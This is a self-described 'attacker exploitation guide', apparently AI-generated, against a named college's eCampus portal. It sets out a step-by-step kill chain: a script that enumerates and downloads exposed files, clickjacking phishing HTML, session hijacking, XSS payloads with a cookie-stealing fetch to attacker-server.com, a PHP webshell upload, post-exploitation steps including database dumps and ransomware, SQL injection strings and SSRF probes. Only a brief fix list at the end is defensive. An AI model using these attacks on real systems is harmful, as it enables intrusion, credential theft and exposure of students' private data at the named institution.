# ☠️ Attacker Exploitation Guide — ecampus.kgkite.ac.in
## "What Can An Attacker Actually Do With These Vulnerabilities?"
**Classification:** Defensive Intelligence | Bug Bounty Research  
**Target:** https://ecampus.kgkite.ac.in  
**Date:** 2026-07-31

> ⚠️ **IMPORTANT:** This document is created for **defensive purposes only** — to help the security team understand the real-world impact of each vulnerability so they can prioritize fixes correctly. Do NOT use this knowledge to attack systems you don't own.

---

## 🗺️ Attacker's View — Full Kill Chain

```
RECON ──► FOOTHOLD ──► ESCALATE ──► PERSIST ──► EXFILTRATE
  │           │             │            │             │
Subdomain   Password      Session     Webshell      Student DB
Discovery   Reset Abuse   Hijack      Upload        Financial Data
21 found    Any Student   Via Cookie  Via Upload    Doc Exfil
            Account       No Secure   Directory     30+ Docs
```

---

## 💀 EXPLOIT 1 — Student Account Takeover (Easiest Attack)

**Vulnerability Used:** Weak Password Reset (DOB disabled) + Roll Number Pattern  
**Skill Required:** Beginner  
**Time to Exploit:** ~10 minutes  
**Success Rate:** HIGH (75%)

### What an Attacker Does — Step by Step:

```
STEP 1: Discover Roll Number Pattern
─────────────────────────────────────
→ Attacker visits any public page or guesses:
   Pattern: 22CSE001, 22CSE002, 23EEE001, etc.
   (Year + Department + Number — standard Indian college format)

STEP 2: Guess Student Email
────────────────────────────
→ Most colleges use predictable email formats:
   rollno@kgkite.ac.in  OR  22cse001@kgkite.ac.in
   (Attacker can also find these via LinkedIn, social media)

STEP 3: Visit Password Reset Page
───────────────────────────────────
→ https://ecampus.kgkite.ac.in/student/forgot-password
→ Enter: roll_number = 22CSE001
→ Enter: email = 22cse001@kgkite.ac.in
→ DOB field is COMMENTED OUT — NOT CHECKED!
→ Reset link arrives at student's email (or attackers own email if guessed wrong)

STEP 4 (If Email is Known): Account Takeover
──────────────────────────────────────────────
→ Attacker sets up a fake email server for a guessable address
→ OR tricks a student into sharing the reset link (social engineering)
→ Gains full access to the student's account
```

### What Attacker Can Access After Login:
- ✅ Student's personal information (name, DOB, address, phone)
- ✅ Academic records (marks, GPA, attendance, semester results)
- ✅ Fee payment history and financial records
- ✅ Internal timetable, exam schedule
- ✅ Communication with faculty
- ✅ Impersonate the student for academic fraud

---

## 💀 EXPLOIT 2 — Mass Document Exfiltration (No Login Needed)

**Vulnerability Used:** Exposed `/uploads/faculty/` directory  
**Skill Required:** Beginner  
**Time to Exploit:** 5 minutes  
**Success Rate:** CONFIRMED (Files already indexed publicly)

### What an Attacker Does:

```
STEP 1: Access Known Document URLs
────────────────────────────────────
→ These URLs are already in Google / Wayback Machine index:
   https://ecampus.kgkite.ac.in/uploads/faculty/iqac_activities/soft_copies/1755680531_1.Approval
   https://ecampus.kgkite.ac.in/uploads/faculty/iqac_activities/soft_copies/1755680531_3.Attendance
   ... (30+ documents confirmed accessible)

STEP 2: Write a Simple Script to Enumerate ALL Files
──────────────────────────────────────────────────────
→ Files named with UNIX timestamps (predictable!):
   1755680531_file.pdf  →  Timestamp: 2025-08-19 ~12:00 UTC
   Attacker generates all timestamps in a range and guesses filenames:
   
   import requests
   from datetime import datetime, timedelta
   
   base_time = 1755000000  # Start timestamp
   end_time  = 1765000000  # End timestamp
   
   for ts in range(base_time, end_time, 100):
       for suffix in ['_1', '_2', '_3', '_4', '_5']:
           url = f"https://ecampus.kgkite.ac.in/uploads/faculty/iqac_activities/soft_copies/{ts}{suffix}"
           r = requests.head(url)
           if r.status_code == 200:
               print(f"FOUND: {url}")

STEP 3: Download Everything
─────────────────────────────
→ Hundreds of documents containing:
   - Student attendance sheets with signatures
   - Faculty approval letters
   - IQAC internal activity reports
   - Event guest lists and programme details
   - Internal committee documents
```

### Real Impact:
- 📋 **Privacy violation** of thousands of students (FERPA/Indian IT Act)
- 📋 **Institutional reputation damage** — internal records leaked
- 📋 **Blackmail/extortion** material using private documents
- 📋 **Academic fraud** — attendance manipulation proofs

---

## 💀 EXPLOIT 3 — Clickjacking Attack (Credential Theft)

**Vulnerability Used:** Missing `X-Frame-Options` Header  
**Skill Required:** Beginner  
**Time to Build:** 30 minutes  
**Success Rate:** HIGH

### What an Attacker Does:

```
STEP 1: Create Malicious Webpage
──────────────────────────────────
→ Attacker registers a domain like "kgkite-portal.com" or "ecampus-login.net"
→ Embeds the real eCampus in an invisible iframe:

<!DOCTYPE html>
<html>
<head>
  <style>
    /* Real eCampus login — invisible, on top */
    iframe {
      opacity: 0.01;        /* Nearly invisible */
      position: absolute;
      top: 100px;
      left: 200px;
      width: 400px;
      height: 300px;
      z-index: 999;
    }
    /* Fake login form underneath — visible */
    .fake-login {
      position: absolute;
      top: 100px; left: 200px;
      background: white;
      padding: 20px;
      border: 1px solid #ccc;
    }
  </style>
</head>
<body>
  <!-- Real eCampus student login (invisible overlay) -->
  <iframe src="https://ecampus.kgkite.ac.in/student/login"></iframe>
  <!-- Fake UI underneath -->
  <div class="fake-login">
    <h3>KGiSL eCampus — Sign In</h3>
    <input placeholder="Roll Number" />
    <input placeholder="Password" type="password"/>
    <button>Login</button>
  </div>
</body>
</html>

STEP 2: Trick Students into Visiting
──────────────────────────────────────
→ Send WhatsApp/email: "Important: Your exam result is available. Click here to check."
→ Student visits fake site
→ Student THINKS they're clicking on the fake form buttons
→ They're actually clicking on the REAL eCampus login (invisible)
→ Their real credentials get submitted to the real site

STEP 3: Harvest Credentials
─────────────────────────────
→ Attacker intercepts submitted form data
→ Gets real roll number + password
→ Full account access
```

---

## 💀 EXPLOIT 4 — Session Hijacking via Public WiFi / HTTP

**Vulnerability Used:** Session Cookie Missing `Secure` Flag  
**Skill Required:** Intermediate  
**Time to Exploit:** 15 minutes (on same network)

### What an Attacker Does:

```
STEP 1: Setup Network Sniffing
────────────────────────────────
→ Attacker on same network as victim (college WiFi, library, canteen)
→ Tools: Wireshark, BetterCap, mitmproxy

STEP 2: Intercept HTTP Traffic
────────────────────────────────
→ XSRF-TOKEN cookie has NO "Secure" flag
→ If student's browser makes ANY accidental HTTP request:
   GET http://ecampus.kgkite.ac.in/ (not HTTPS)
→ Browser sends session cookies over plaintext HTTP
→ Attacker captures:
   XSRF-TOKEN: eyJpdiI6ImNLT2xCZXZmNGQ4RVBIYWJaWHVZcXc9PS...
   ecampus_session: eyJpdiI6IkM4UnBZSEQ1ODZXV2xTaXFYYURMMXc9PS...

STEP 3: Replay the Session
────────────────────────────
→ Attacker uses captured cookies in their browser:
   Cookie: ecampus_session=eyJ... ; XSRF-TOKEN=eyJ...
→ Instantly logged in AS the victim student
→ No password needed — full account access
```

### Additional Cookie Attack (SameSite Missing):
```
→ No SameSite=Strict means Cross-Site Request Forgery (CSRF) is possible
→ Attacker can force a logged-in student to unknowingly perform actions:
   - Change email/password
   - Submit fake assignments
   - Manipulate exam registrations
```

---

## 💀 EXPLOIT 5 — XSS (Cross-Site Scripting) — CSRF Token Theft

**Vulnerability Used:** Missing Content-Security-Policy + application input fields  
**Skill Required:** Intermediate  
**Time to Exploit:** Variable

### What an Attacker Does:

```
STEP 1: Find XSS Injection Point
───────────────────────────────────
→ Look for input fields that reflect data back:
   - Search fields
   - Profile fields (name, bio, etc.)
   - Error messages
   
→ Test payload in any input:
   Payload 1: <script>alert('XSS')</script>
   Payload 2: <img src=x onerror=alert(document.cookie)>
   Payload 3: '><script>alert('XSS')</script>
   Payload 4: javascript:alert(1)

STEP 2 (If Stored XSS Found): Steal Session Tokens From All Users
──────────────────────────────────────────────────────────────────
→ Without CSP header, any successful XSS can:

<script>
// Steal all cookies and CSRF tokens
var stolen_data = {
  cookies: document.cookie,
  csrf_token: document.querySelector('meta[name="csrf-token"]').content,
  url: window.location.href,
  user_agent: navigator.userAgent
};

// Send to attacker's server
fetch('https://attacker-server.com/steal?data=' + 
      btoa(JSON.stringify(stolen_data)));
</script>

STEP 3: Mass Account Compromise
──────────────────────────────────
→ If Stored XSS in a shared area (notice board, comments):
→ EVERY student/faculty who views that page gets their session stolen
→ Attacker gets hundreds of valid sessions automatically
```

---

## 💀 EXPLOIT 6 — PHP 7.3.33 EOL — Remote Code Execution (Advanced)

**Vulnerability Used:** PHP 7.3.33 EOL + Known CVEs  
**Skill Required:** Advanced  
**Time to Exploit:** Variable  
**Success Rate:** MEDIUM (depends on specific CVE applicability)

### What an Attacker Does:

```
STEP 1: Fingerprint Exact PHP Version
───────────────────────────────────────
→ Confirmed from header: X-Powered-By: PHP/7.3.33

STEP 2: Search for Applicable CVEs
────────────────────────────────────
→ CVE-2021-21708: Use-after-free in PHP 7.3 (CVSS 9.8)
→ CVE-2020-7068: Use-after-free in EXIF extension
→ Multiple unpatched CVEs from 2021-2026 for PHP 7.3.x

STEP 3: Attempt RCE Via PHP Vulnerabilities
─────────────────────────────────────────────
→ If file upload functionality is found with any PHP processing:
   - Upload polyglot file: GIF89a<?php system($_GET['cmd']); ?>
   - Access file via: /uploads/shell.jpg?cmd=id
   → Server executes PHP code → Remote Code Execution

STEP 4: Post-Exploitation
──────────────────────────
→ Once RCE achieved:
   - Read /var/www/html/.env → Get database credentials
   - Access MySQL database → Dump ALL student data
   - Read Laravel app keys → Forge session tokens for any user
   - Install persistent backdoor
   - Pivot to internal network (api.kgkite.ac.in, adfs.kgkite.ac.in)
   - Ransomware deployment
```

### Attacker's Prize After RCE:
```
$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=ecampus_db
DB_USERNAME=ecampus_user
DB_PASSWORD=PLAINTEXT_PASSWORD_HERE  ← ALL DB CREDENTIALS
APP_KEY=base64:XXXXXXX               ← Laravel encryption key
MAIL_PASSWORD=...                    ← Email server credentials

$ mysql -u ecampus_user -p ecampus_db -e "SELECT * FROM students LIMIT 5;"
→ ALL STUDENT DATA DUMPED
```

---

## 💀 EXPLOIT 7 — ADFS SSO Takeover (Most Severe)

**Vulnerability Used:** `adfs.kgkite.ac.in` subdomain (Active Directory Federation Services)  
**Skill Required:** Advanced  
**Time to Exploit:** Variable  
**Impact:** CATASTROPHIC

### What an Attacker Does:

```
STEP 1: Enumerate ADFS Endpoint
─────────────────────────────────
→ adfs.kgkite.ac.in is Active Directory Federation Services
→ This is the SSO (Single Sign-On) system for the ENTIRE institution

STEP 2: Attack ADFS
─────────────────────
→ Test for known ADFS vulnerabilities:
   - CVE-2019-1126: ADFS bypass
   - Default credential attacks on admin endpoint
   - Token forgery via leaked signing certificates
   
→ ADFS endpoint: https://adfs.kgkite.ac.in/adfs/ls/

STEP 3: Forge Authentication Tokens
──────────────────────────────────────
→ If ADFS signing key is leaked or guessable:
→ Attacker forges SAML tokens for ANY user including ADMIN

STEP 4: Access ALL Integrated Services
───────────────────────────────────────
→ ADFS SSO likely integrates with:
   - eCampus portal (admin access)
   - Microsoft 365 (email, SharePoint, Teams)
   - Moodle LMS
   - Results portal
   - Recording portal
→ ONE ADFS compromise = FULL INSTITUTIONAL ACCESS
```

---

## 💀 EXPLOIT 8 — SQL Injection (If Present in Parameters)

**Vulnerability Used:** PHP 7.3 application, no WAF detected  
**Skill Required:** Intermediate  
**Test Targets:** Login, search fields, URL parameters

### What an Attacker Does:

```
STEP 1: Test Login Forms
─────────────────────────
POST /student/login
roll_number=' OR '1'='1'--
password=anything

→ If vulnerable: bypasses authentication completely

STEP 2: Time-Based Blind SQLi (Stealthy)
──────────────────────────────────────────
roll_number=' AND SLEEP(5)--
→ If response delays 5 seconds: SQLi confirmed

STEP 3: Extract Database Contents
────────────────────────────────────
→ Dump entire students table:
   ' UNION SELECT 1, group_concat(username,0x3a,password), 3 FROM students--

→ Access:
   - All student roll numbers and passwords (hashed or plain)
   - Faculty credentials
   - Admin accounts
   - Financial transaction records
```

---

## 💀 EXPLOIT 9 — SSRF — Internal Network Discovery

**Vulnerability Used:** No outbound request filtering (if SSRF-prone params exist)  
**Skill Required:** Intermediate  
**Target Parameters:** Any URL parameter in the app

### What an Attacker Does:

```
STEP 1: Find URL-accepting Parameters
───────────────────────────────────────
→ Look for parameters like: url=, redirect=, fetch=, load=, src=, path=

STEP 2: Test SSRF Payloads
────────────────────────────
→ Access internal services:
   url=http://127.0.0.1:3306    → MySQL (port 3306)
   url=http://127.0.0.1:6379    → Redis (session store)
   url=http://127.0.0.1:8080    → Internal admin panel
   url=http://169.254.169.254/latest/meta-data/  → Cloud metadata

STEP 3: Lateral Movement to Internal Network
─────────────────────────────────────────────
→ From ecampus server, reach internal systems:
   http://10.0.0.1/ → Internal router
   http://192.168.1.1/ → LAN gateway
→ Access systems not exposed to internet:
   - Internal database servers
   - HR systems
   - Academic admin systems
```

---

## 📊 Attacker Impact Matrix

| Vulnerability | Attacker Action | Impact | Skill Level | Time |
|---|---|---|---|---|
| PHP 7.3 EOL | RCE via known CVEs | Server takeover, full DB dump | Advanced | Hours |
| Exposed Uploads | Mass document download | Student data leak, privacy breach | Beginner | Minutes |
| Weak Password Reset | Account takeover (any student) | Identity theft, academic fraud | Beginner | 10 min |
| Missing X-Frame-Options | Clickjacking credential theft | Mass credential harvest | Beginner | 30 min |
| Session Cookie (no Secure) | Session hijack via WiFi | Impersonate any student | Intermediate | 15 min |
| Missing CSP | XSS → Token theft | Mass session compromise | Intermediate | Variable |
| Missing HSTS | SSL strip / MITM | Intercept all traffic | Intermediate | 5 min (same net) |
| ADFS Subdomain | SSO takeover | Entire institution compromise | Advanced | Variable |
| SQL Injection (if present) | DB dump | ALL student/faculty data | Intermediate | Minutes |
| SSRF (if present) | Internal network access | Internal system compromise | Intermediate | Variable |
| PHP Version Disclosure | Targeted CVE exploitation | Precision attacks | Advanced | Variable |

---

## 🎯 Attacker Priority Order (Real-World Scenario)

```
1️⃣  FIRST THING: Student account takeover via password reset
    → Easiest, no tools needed, just a browser
    → Confirms application is live and exploitable

2️⃣  SECOND: Download all exposed faculty documents
    → Script to enumerate timestamps and download everything
    → No authentication required

3️⃣  THIRD: Set up clickjacking phishing page
    → Register similar domain
    → Harvest credentials from students/faculty

4️⃣  FOURTH: Hijack sessions on campus WiFi
    → Sit in college canteen/library with laptop
    → Intercept HTTP session cookies from nearby students

5️⃣  FIFTH: Attempt SQL injection on login/search forms
    → May yield full database

6️⃣  SIXTH (Advanced): Investigate ADFS endpoint
    → Full institutional SSO takeover potential

7️⃣  SEVENTH (Most Severe): RCE via PHP vulnerabilities
    → Install backdoor, dump entire database, pivot internally
```

---

## 🛡️ What Happens If NOT Fixed

```
SHORT TERM (Days):
├── Student account takeovers via password reset abuse
├── Faculty document exfiltration (already possible)
└── Credential phishing via clickjacking

MEDIUM TERM (Weeks):
├── Mass student data sale on dark web
├── Academic fraud (grade manipulation, attendance forgery)
├── Ransomware attack via PHP RCE
└── Financial fraud via payment portal

LONG TERM (Months):
├── ADFS/SSO compromise → full institutional control
├── Microsoft 365 accounts compromised (email, files)
├── Regulatory fines (Indian IT Act, UGC data protection rules)
└── Complete loss of institutional trust
```

---

## 🔒 Urgency Matrix for Defenders

```
FIX IN 24 HOURS:
├── Restrict /uploads/ to authenticated users
└── Add DOB check back to password reset

FIX THIS WEEK:
├── Upgrade PHP 7.3 → 8.2+
├── Add all security headers (HSTS, CSP, X-Frame, etc.)
├── Set Secure + SameSite on cookies
└── Add rate limiting to password reset

FIX THIS MONTH:
├── Audit ADFS (adfs.kgkite.ac.in)
├── Audit api.kgkite.ac.in
├── WAF implementation
└── Penetration test all 21 subdomains
```

---
*This guide was generated by HexStrike AI for defensive intelligence purposes only.*  
*All information is for responsible disclosure and security improvement.*
